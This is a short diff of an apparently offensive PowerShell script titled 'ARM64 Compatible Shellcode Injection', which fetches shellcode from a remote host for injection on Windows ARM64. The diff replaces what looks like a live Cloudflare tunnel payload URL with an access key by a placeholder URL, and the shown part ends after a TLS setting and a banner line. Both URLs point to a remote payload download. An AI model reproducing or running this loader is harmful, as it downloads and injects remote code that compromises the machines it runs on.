@@ -1,7 +1,7 @@
 # ARM64 Compatible Shellcode Injection - Standard Win32 API
 # Works on Windows ARM64 (no direct syscalls)
 
-$u='https://concentrations-omaha-topic-hanging.trycloudflare.com/payloads/shellcode.txt?key=b45140e1b16ca05973c1fa308729c8fc'
+$u='https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN'
 [Net.ServicePointManager]::SecurityProtocol='Tls12'
 
 Write-Host "[*] ARM64 Injection - Win32 API"
